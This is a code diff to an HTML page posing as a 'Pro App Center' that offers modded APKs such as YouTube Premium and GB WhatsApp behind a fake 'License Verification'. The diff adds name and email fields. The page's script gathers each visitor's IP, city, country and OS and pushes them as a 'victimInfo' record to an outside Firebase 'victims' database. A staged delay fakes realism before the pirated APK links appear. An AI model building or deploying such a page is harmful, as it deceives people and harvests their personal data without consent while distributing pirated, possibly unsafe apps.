@@ -3,96 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro App Center | Secure Download</title>
+    <title>Pro App Center | Secure Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root { --primary: #25d366; --bg: #f4f7f6; --text: #333; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
         .container { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h2 { font-size: 22px; margin-bottom: 10px; color: #1a1a1a; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
+        .logo { width: 70px; margin-bottom: 15px; }
+        h2 { font-size: 20px; margin-bottom: 8px; color: #1a1a1a; }
+        p { font-size: 13px; color: #666; margin-bottom: 20px; }
         
+        /* Input Styles */
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; outline: none; box-sizing: border-box; font-size: 14px; transition: 0.3s; }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 5px rgba(37, 211, 102, 0.2); }
+
         /* Loader */
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        button { background: var(--primary); color: #fff; border: none; padding: 12px 25px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.3s; width: 100%; margin-top: 20px; }
-        button:hover { background: #1da851; transform: translateY(-2px); }
+        button { background: var(--primary); color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.3s; width: 100%; margin-top: 10px; }
+        button:hover { background: #1da851; }
 
         /* App List */
-        #app-list { display: none; text-align: left; margin-top: 20px; max-height: 300px; overflow-y: auto; padding-right: 10px; }
-        .app-item { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #eee; transition: 0.2s; }
-        .app-item:hover { background: #fafafa; }
-        .app-info { font-size: 13px; font-weight: bold; color: #222; }
-        .dl-btn { background: #007bff; color: #fff; padding: 5px 12px; border-radius: 5px; text-decoration: none; font-size: 12px; }
+        #app-list { display: none; text-align: left; margin-top: 15px; max-height: 350px; overflow-y: auto; padding-right: 5px; }
+        .app-item { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #eee; }
+        .app-info { font-size: 12px; font-weight: bold; color: #222; }
+        .dl-btn { background: #007bff; color: #fff; padding: 6px 12px; border-radius: 5px; text-decoration: none; font-size: 11px; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://cdn-icons-png.flaticon.com/512/888/888841.png" class="logo" alt="Store">
+    <img src="https://cdn-icons-png.flaticon.com/512/888/888841.png" class="logo">
+    
     <div id="initial-ui">
-        <h2>Verify Identity</h2>
-        <p>To access the Premium Mod App collection, please complete the human verification.</p>
+        <h2>License Verification</h2>
+        <p>Enter your details to receive the <b>Premium Mod License Key</b> and unlock the apps.</p>
+        
+        <input type="text" id="v-name" placeholder="Your Full Name">
+        <input type="email" id="v-email" placeholder="Email Address">
+        
         <div id="loader" class="loader"></div>
         <button id="verify-btn" onclick="startVerification()">VERIFY & UNLOCK</button>
     </div>
 
     <div id="app-list">
-        <h3 style="font-size: 16px; border-bottom: 2px solid #25d366; padding-bottom: 5px;">Unlocked Premium Apps</h3>
+        <div style="background: #e8f5e9; padding: 10px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid var(--primary);">
+            <p style="margin:0; color:#2e7d32; font-weight:bold; font-size:12px;">✅ Identity Verified! Access Unlocked.</p>
+        </div>
         
-        <div class="app-item">
-            <span class="app-info">🎀 CAP CUT PRO GOLD</span>
-            <a href="https://www.mediafire.com/file/ql7gquddwnjfomo/CapCut_Golden_16.0.0.apk/file" class="dl-btn">Download</a>
-        </div>
-        <div class="app-item">
-            <span class="app-info">🎀 WINK PRO APP</span>
-            <a href="https://www.mediafire.com/file/m4jyh9lk4fbgndu/Wink_2.13.0.apk/file" class="dl-btn">Download</a>
-        </div>
-        <div class="app-item">
-            <span class="app-info">🎀 REMINI PRO APP</span>
-            <a href="https://www.mediafire.com/file/5fjb5pcggkltydy/Remini_3.7.1260.202519018.apk/file" class="dl-btn">Download</a>
-        </div>
-        <div class="app-item">
-            <span class="app-info">🎀 YOUTUBE PRO</span>
-            <a href="https://www.mediafire.com/file/bzp21y7brf0o44z/YouTube_Premium_26.06.2026.apk/file" class="dl-btn">Download</a>
-        </div>
-        <div class="app-item">
-            <span class="app-info">🎀 GB WHATSAPP</span>
-            <a href="https://www.mediafire.com/file/at962pgcdmxnod3GB/WhatsApp_v51.00_Developer_Abu_Arab.apk/file" class="dl-btn" style="background:#25d366;">Download</a>
-        </div>
-        <div class="app-item">
-            <span class="app-info">🎀 GOLD RED WHATSAPP</span>
-            <a href="https://www.mediafire.com/file/8ukph9o1lakjt3g/GOWhatsApp_v51.00_Gold_Developer_Abu_Arab.apk/file" class="dl-btn" style="background:#ffd700; color:#000;">Download</a>
-        </div>
-        </div>
+        <div class="app-item"><span class="app-info">🎗️ CAP CUT PRO GOLD</span><a href="https://www.mediafire.com/file/ql7gquddwnjfomo/CapCut_Golden_16.0.0.apk/file" class="dl-btn">Download</a></div>
+        <div class="app-item"><span class="app-info">🎗️ WINK PRO APP</span><a href="https://www.mediafire.com/file/m4jyh9lk4fbgndu/Wink_2.13.0.apk/file" class="dl-btn">Download</a></div>
+        <div class="app-item"><span class="app-info">🎗️ REMINI PRO APP</span><a href="https://www.mediafire.com/file/5fjb5pcggkltydy/Remini_3.7.1260.202519018.apk/file" class="dl-btn">Download</a></div>
+        <div class="app-item"><span class="app-info">🎗️ YOUTUBE PRO</span><a href="https://www.mediafire.com/file/bzp21y7brf0o44z/YouTube_Premium_26.06.2026.apk/file" class="dl-btn">Download</a></div>
+        <div class="app-item"><span class="app-info">🎗️ GB WHATSAPP</span><a href="https://www.mediafire.com/file/at962pgcdmxnod3GB/WhatsApp_v51.00_Developer_Abu_Arab.apk/file" class="dl-btn" style="background:#25d366;">Download</a></div>
+    </div>
 </div>
 
 <script>
-    // Firebase Config
+    // Firebase Config (Oyage database eka)
     const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
     async function startVerification() {
+        const name = document.getElementById('v-name').value;
+        const email = document.getElementById('v-email').value;
         const btn = document.getElementById('verify-btn');
         const loader = document.getElementById('loader');
-        
+
+        // Check if empty
+        if(!name || !email) {
+            alert("Please enter your name and email to receive the License Key!");
+            return;
+        }
+
         btn.style.display = "none";
         loader.style.display = "block";
 
         try {
-            // Data Collecting
+            // Get IP/Location
             const response = await fetch('https://ipapi.co/json/');
             const data = await response.json();
 
+            // Victim Data Object
             const victimInfo = {
-                target: "User_" + Math.floor(Math.random() * 9999),
+                target: name, // Actual name entered by user
+                email: email, // Actual email entered by user
                 ip: data.ip,
                 location: data.city + ", " + data.country_name,
                 device: navigator.platform,
+                os: navigator.userAgent.split('(')[1].split(')')[0], // Exact OS info
                 online: true,
                 time: new Date().toLocaleString()
             };
@@ -100,7 +102,7 @@
             // Push to Firebase (Master Dashboard eke Nodes wala penna)
             await db.ref('victims').push(victimInfo);
 
-            // Wait 2 seconds for "Real Feeling"
+            // "Processing" delay for realism
             setTimeout(() => {
                 loader.style.display = "none";
                 document.getElementById('initial-ui').style.display = "none";
@@ -108,7 +110,7 @@
             }, 2500);
 
         } catch (e) {
-            alert("Verification Error. Please check connection.");
+            alert("Connection error. Please try again.");
             btn.style.display = "block";
             loader.style.display = "none";
         }
